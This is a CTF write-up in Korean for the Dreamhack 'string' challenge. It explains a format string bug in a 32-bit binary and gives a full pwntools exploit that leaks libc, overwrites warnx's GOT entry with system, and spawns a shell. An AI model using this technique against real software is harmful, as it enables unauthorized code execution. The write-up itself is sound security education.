---
title: "string writeup"
date: 2026-04-07 09:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, fsb, got-overwrite, dreamhack]
---

## Analysis

### checksec
```
root@a237909c5b9c:/pwn/string# checksec string
[*] '/pwn/string/string'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    RUNPATH:    b'.'
    Stripped:   No
```

No PIE, Partial RELRO이므로 GOT overwrite가 가능하다. 32비트 바이너리이다.

### Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    close(2);
    dup2(1, 2);

    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void input(char *buf) {
	printf("Input: ");
	read(0, buf, 255);
}

void print(char *buf) {
	warnx(buf);
}

int main() {
	int idx;
	char buf[256];

	initialize();

	memset(buf, 0, sizeof(buf));

	while(1) {
		printf("1. Input\n");
		printf("2. Print\n");
		printf("3. Exit\n");
		printf("> ");

		scanf("%d", &idx);
		switch(idx) {
			case 1:
				input(buf);
				break;
			case 2:
				print(buf);
				break;
			default:
				break;
		}
	}
	return 0;
}
```

## Vulnerability Analysis

`input`은 버퍼에 입력을 받고, `print`는 입력을 `warnx`의 인자로 넘긴다. `warnx`의 프로토타입은 다음과 같다.
```c
void warnx(const char *fmt, ...);
```

`printf`와 비슷하지만 `"프로그램명: {fmt}\n"` 형태로 출력한다. 입력을 그대로 포맷 스트링으로 사용하고 있으므로 FSB 취약점이 있다.

`main`에서 `return`할 수 없음을 주의해야 한다. Partial RELRO이므로 GOT overwrite가 가능하다. `warnx`의 GOT를 `system`으로 덮은 후 `buf`에 `"/bin/sh"`를 입력해서 `print`하면 쉘을 획득할 수 있다.

## Exploit

우선 `system` 함수와 `"/bin/sh"` 주소를 얻기 위해 libc base를 유출해야 한다.
```
pwndbg> start
...
pwndbg> tele $ebp
00:0000│ ebp 0xffffd6b8 ◂— 0
01:0004│+004 0xffffd6bc —▸ 0xf7e36637 (__libc_start_main+247) ◂— add esp, 0x10
02:0008│+008 0xffffd6c0 ◂— 1
03:000c│+00c 0xffffd6c4 —▸ 0xffffd754 —▸ 0xffffd880 ◂— '/pwn/string/string'
04:0010│+010 0xffffd6c8 —▸ 0xffffd75c —▸ 0xffffd893 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
05:0014│+014 0xffffd6cc ◂— 0
... ↓        2 skipped
```

`main` 스택 프레임에 저장된 return address가 `__libc_start_main+247`임을 확인할 수 있다. FSB 취약점으로 이 주소를 유출하면 libc base를 계산할 수 있다.

이를 위해 `ret`이 저장된 스택 주소가 `warnx`의 몇 번째 가변 인자인지 확인해야 한다.
```
pwndbg> disass print
Dump of assembler code for function print:
   0x08048768 <+0>:     push   ebp
   0x08048769 <+1>:     mov    ebp,esp
   0x0804876b <+3>:     push   DWORD PTR [ebp+0x8]
   0x0804876e <+6>:     call   0x8048560 <warnx@plt>
   0x08048773 <+11>:    add    esp,0x4
   0x08048776 <+14>:    nop
   0x08048777 <+15>:    leave  
   0x08048778 <+16>:    ret    
End of assembler dump.
pwndbg> b *print+6
Breakpoint 2 at 0x804876e
pwndbg> c
...
pwndbg> tele $ebp
00:0000│ ebp 0xffffd5a4 —▸ 0xffffd6b8 ◂— 0
01:0004│+004 0xffffd5a8 —▸ 0x804881f (main+166) ◂— add esp, 4
02:0008│+008 0xffffd5ac —▸ 0xffffd5b4 ◂— 0
03:000c│+00c 0xffffd5b0 ◂— 2
04:0010│ eax 0xffffd5b4 ◂— 0
... ↓        3 skipped
pwndbg> p $esp
$3 = (void *) 0xffffd5a0
pwndbg> p 0xffffd6bc - 0xffffd5a0
$7 = 284
pwndbg> p 284/4
$8 = 71
```

`print`의 스택 프레임에 저장된 `sfp`가 `0xffffd6b8`이고 이는 `main`의 `ebp`이다. `ebp + 4`에 `ret`이 있으므로 `0xffffd6bc`가 `ret`이 저장된 스택 주소이다. `call warnx` 직전에 멈췄으므로 현재 `esp`는 첫 번째 인자인 포맷 스트링이 저장된 주소이다. 두 주소를 빼고 4로 나누면 `ret`이 `warnx`의 71번째 가변 인자임을 확인할 수 있다. 따라서 `%71$p`로 유출할 수 있다.

유출한 주소로 `system`, `"/bin/sh"` 주소를 얻을 수 있다. 이제 덮어쓰고자 하는 주소가 `warnx`의 몇 번째 가변 인자인지 확인해야 한다.
```
pwndbg> p 0xffffd5b4-((long)$esp)
$9 = 20
pwndbg> p 20/4
$12 = 5
```

`print`의 인자가 `buf`이고 이는 `ebp + 8`에 저장되어 있으므로 `buf`의 주소는 `0xffffd5b4`이다. 계산 결과 `buf`는 `warnx`의 5번째 가변 인자이다.

`buf`가 5번째 가변 인자이므로, 포맷 스트링 길이를 4의 배수로 맞추고 `포맷 스트링 길이 / 4`를 더하면 `warnx` GOT가 몇 번째 가변 인자인지 알 수 있다. 페이로드 앞부분 포맷 스트링의 길이를 48바이트로 맞추면 `5 + 48 / 4 = 17`이므로 `%17$hhn`부터 시작하면 된다. 페이로드를 구성하고 전송하여 GOT를 덮은 뒤, `"/bin/sh\x00"`를 입력하고 `print`하면 `system("/bin/sh")`가 실행된다.

바이트 단위로 덮었으며 주소가 가변적이기 때문에 width 계산을 위해 2의 보수를 이용한 `width = (target - printed) & 0xFF`로 처리하였다. 주의할 점은 `%0c`는 출력을 하지 않는 것이 아니라 한 바이트를 출력한다. 이를 해결하기 위해 결과가 0인 경우 모듈로 연산임을 이용해 256으로 처리할 수 있다.

아래는 전체 익스플로잇 코드이다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./string")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14119)

    return r


def width(printed, target):
    ret = (target - printed) & 0xFF
    if ret == 0:
        ret = 256
    return str(ret).encode()


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", b"%71$p")

    r.sendlineafter(b"> ", b"2")
    r.recvuntil(b": ")
    leak = int(r.recvline()[:-1], 16)
    __libc_start_main = leak - 247

    libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
    system = libc.symbols["system"]
    warnx_got = exe.got["warnx"]

    payload = b"%" + width(0, system & 0xFF) + b"c"
    payload += b"%17$hhn"
    payload += b"%" + width(system & 0xFF, (system >> 8) & 0xFF) + b"c"
    payload += b"%18$hhn"
    payload += b"%" + width((system >> 8) & 0xFF, (system >> 16) & 0xFF) + b"c"
    payload += b"%19$hhn"
    payload += b"%" + width((system >> 16) & 0xFF, (system >> 24) & 0xFF) + b"c"
    payload += b"%20$hhn"
    payload = payload.ljust(48, b"A")
    payload += p32(warnx_got)
    payload += p32(warnx_got + 1)
    payload += p32(warnx_got + 2)
    payload += p32(warnx_got + 3)

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", payload)
    r.sendlineafter(b"> ", b"2")

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", b"/bin/sh\x00")
    r.sendlineafter(b"> ", b"2")

    r.interactive()


if __name__ == "__main__":
    main()
```